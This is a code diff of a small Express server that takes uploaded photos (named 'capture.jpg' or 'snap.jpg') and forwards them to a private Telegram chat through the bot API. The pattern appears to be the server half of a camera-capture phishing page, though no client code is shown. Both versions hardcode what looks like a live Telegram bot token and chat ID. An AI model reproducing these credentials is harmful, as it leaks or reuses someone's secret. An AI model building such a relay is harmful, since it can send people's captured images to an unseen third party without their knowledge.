@@ -1,58 +1,44 @@
-// server.js
 const express = require('express');
-const path = require('path');
-const cors = require('cors');
-const fetch = require('node-fetch');
+const multer = require('multer');
 const FormData = require('form-data');
+const fetch = require('node-fetch');
+const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const upload = multer({ storage: multer.memoryStorage() });
 
-// Your Telegram token & chat id (kept exactly as you requested)
+// Your Credentials
 const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
 const CHAT_ID = '5574741182';
+const PORT = process.env.PORT || 3000;
 
-app.use(cors());
-app.use(express.json({ limit: '12mb' }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static('public'));
 
-app.post('/api/upload-photo', async (req, res) => {
-  try {
-    const { dataUrl } = req.body;
-    if (!dataUrl || !dataUrl.startsWith('data:image/')) {
-      return res.status(400).json({ ok: false, error: 'Invalid image' });
+app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
+    try {
+        if (!req.file) return res.status(400).json({ error: 'No file' });
+
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', req.file.buffer, {
+            filename: 'capture.jpg',
+            contentType: 'image/jpeg',
+        });
+
+        const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        });
+
+        const result = await telegramRes.json();
+        if (result.ok) {
+            res.json({ success: true });
+        } else {
+            res.status(500).json({ error: result.description });
+        }
+    } catch (err) {
+        res.status(500).json({ error: 'Server error' });
     }
-
-    const matches = dataUrl.match(/^data:(image\/\w+);base64,(.+)$/);
-    if (!matches) return res.status(400).json({ ok: false, error: 'Bad format' });
-
-    const mime = matches[1];
-    const b64 = matches[2];
-    const buffer = Buffer.from(b64, 'base64');
-
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('photo', buffer, { filename: 'snap.jpg', contentType: mime });
-
-    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: form
-    });
-    const json = await resp.json();
-
-    if (!json.ok) {
-      console.error('Telegram API error:', json);
-      return res.status(500).json({ ok: false, error: 'Telegram API error', telegram: json });
-    }
-
-    res.json({ ok: true });
-  } catch (err) {
-    console.error('Upload error:', err);
-    res.status(500).json({ ok: false, error: String(err) });
-  }
 });
 
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-});
-      
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
